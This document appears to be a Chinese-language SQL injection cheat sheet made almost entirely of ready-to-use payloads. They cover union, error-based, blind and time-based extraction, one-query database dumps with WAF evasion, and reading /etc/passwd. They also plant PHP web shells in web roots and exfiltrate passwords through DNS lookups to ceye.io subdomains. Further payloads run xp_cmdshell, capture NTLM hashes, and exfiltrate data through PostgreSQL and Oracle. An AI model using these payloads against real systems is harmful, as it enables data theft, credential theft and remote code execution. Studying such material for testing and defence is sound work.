  ##### 注释符
	# 
	-- 注意这里有个空格
	/* hello */
	/*! hello */
	/*!32302 10*/ MYSQL version 3.23.02
  ##### 联合查询
  	得到列数
	order by或group by
	不断增加数字，直到得到报错响应
	1' ORDER BY 1--+	#True
	1' ORDER BY 2--+	#True
	1' ORDER BY 3--+	#True
	1' ORDER BY 4--+	#False - 只有三个列数
	或
	1' GROUP BY 1--+	#True
	1' GROUP BY 2--+	#True
	1' GROUP BY 3--+	#True
	1' GROUP BY 4--+	#False - 只有三个列数
	报错类型的union select
	1' UNION SELECT @--+     
	1' UNION SELECT @,@--+   
	1' UNION SELECT @,@,@--+ 
	报错类型的LIMIT INTO
	注入点位于LIMIT后，查找列数
	1' LIMIT 1,1 INTO @--+    
	1' LIMIT 1,1 INTO @,@--+  
	1' LIMIT 1,1 INTO @,@,@--+    #没报错 只有三个列数
	information_schema 提取数据库
	UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
	UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
	UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
	UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
	Mysql >=4.1没有information_schema
	获取列数
	?id=(1)and(SELECT * from db.users)=(1)
	获取列名
	?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
	MySQL 5的方法
	-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
	--#1060 - Duplicate column name 'id'

	-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
	-- #1060 - Duplicate column name 'name'

	-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
	不知道列名提取数据
	select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
	http://url/index.php?id=1 order by 6
	http://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
	http://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -

  ##### 基于报错注入
  	MySQL >= 4.1
	(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
	'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
	UpdateXML 函数
	AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
	AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
	AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
	AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
	AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
	
	' and updatexml(null,concat(0x0a,version()),null)-- -
	' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
	Extractvalue函数
	MySQL >= 5.1
	?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
	?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
	?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
	?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
	?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
	NAME_CONST函数
	MySQL >= 5.0
	?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
	?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
	?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
  ##### 盲注
  ###### substring
	?id=1 and substring(version(),1,1)=5
	?id=1 and right(left(version(),1),1)=5
	?id=1 and left(version(),1)=4
	?id=1 and ascii(lower(substr(Version(),1,1)))=51
	?id=1 and (select mid(version(),1,1)=4)
	?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
	?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'

  ###### ORDER BY
	[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -

  ###### REGEXP
	' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
	工作流程
	SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';

	条件语句
	返回正常
	2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
	Response:
	HTTP/1.1 500 Internal Server Error
	返回错误
	2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
	Response:
	HTTP/1.1 200 OK

  ###### MAKE_SET
	AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
	AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
	AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
	AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)

  ###### LIKE
  	SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
  ##### 基于时间注入
  	+BENCHMARK(40000000,SHA1(1337))+
	'%2Bbenchmark(3200,SHA1(1))%2B'
	AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
	RLIKE SLEEP([SLEEPTIME])
	OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))

	SLEEP
	1 and (select sleep(10) from dual where database() like '%')#
	1 and (select sleep(10) from dual where database() like '___')# 
	1 and (select sleep(10) from dual where database() like '____')#
	1 and (select sleep(10) from dual where database() like '_____')#
	1 and (select sleep(10) from dual where database() like 'a____')#
	...
	1 and (select sleep(10) from dual where database() like 's____')#
	1 and (select sleep(10) from dual where database() like 'sa___')#
	...
	1 and (select sleep(10) from dual where database() like 'sw___')#
	1 and (select sleep(10) from dual where database() like 'swa__')#
	1 and (select sleep(10) from dual where database() like 'swb__')#
	1 and (select sleep(10) from dual where database() like 'swi__')#
	...
	1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#

	条件语句
	?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
	?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
	?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
  ##### 一次性转储数据
  	MYSQL DIOS
	(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#

	(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#

	make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

	(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)

	(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))

	(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))

	+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

	(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)

	+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+

	+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+

	+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+

	(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
  ##### 当前查询
  	该表可以列出 DB 目前正在执行的所有操作
	union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

	一条语句导出此表内容
	union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
  ##### 读取文件内容
  	filepriv
	' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
	UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
	GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
  ##### 写shell
  	[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
	[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
	[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
	[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

	[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
	[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
  ##### 截断
  	在 MYSQL 中“ admin ”和“ admin”是一样的。如果数据库中的用户名列有字符限制，则其余字符将被截断。因此，如果数据库的列限制为 20 个字符，并且我们输入一个包含 21 个字符的字符串，那么最后 1 个字符将被删除。
	`username` varchar(20) not null
	payload：username = "admin a"
  ##### 快速查询
  	MySQL >= 5.7.22
	group_concat() = 1024 个符号
	json_arrayagg() > 16,000,000 个符号
	SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
  ##### MYSQL UDF 命令执行
	见windows提权MYSQL udf
  ##### OOB
  	select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
	select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
  ##### DNSLOG
  	MYSQL结合dnslog
	?id=1' and if((select load_file(concat('\\\\',(select database()),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示数据库
	?id=1' and if((select load_file(concat('\\\\',(select schema_name from information_schema.schemata limit {0},1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示表
	?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='dbname' limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示字段
	?id=1' and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示数据
	?id=1' and if((select load_file(concat('\\\\',(select hex(user) from users limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	MSSQL结合dnslog
	查数据
	?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"');
	Sa密码
	?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';EXEC('master..xp_dirtree"\'+@host+'\foobar$"');
	执行命令
	exec master..xp_cmdshell "whoami>D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V ""CERTIFICATE"" D:/temp2>D:/temp3";
	exec master..xp_cmdshell "cmd /v /c""set /p MYVAR=< D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!""";
	exec master..xp_cmdshell "del ""D:/temp"" ""D:/temp2"" ""D:/temp3""";
	postgreSQL结合dnslog
	?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\'';EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
	Oracle结合dnslog
	?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;
	?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
	?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
	?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL;
  ##### NTLM 哈希窃取
  	select load_file('\\\\error\\abc');
	select load_file(0x5c5c5c5c6572726f725c5c616263);
	select 'osanda' into dumpfile '\\\\error\\abc';
	select 'osanda' into outfile '\\\\error\\abc';
	load data infile '\\\\error\\abc' into table database.table_name;